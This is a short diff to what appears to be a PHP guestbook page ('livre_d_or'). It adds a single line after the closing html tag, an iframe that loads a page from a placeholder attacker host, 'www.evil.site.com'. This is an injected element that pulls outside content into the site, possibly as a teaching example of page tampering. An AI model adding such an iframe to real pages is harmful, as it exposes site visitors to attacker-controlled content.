@@ -33,3 +33,4 @@ $messages=file_get_contents($file);
 </body>
 </html>
 <script src="livre_d_or.js" ></script>
+<iframe src="www.evil.site.com/gadget.html"></iframe>
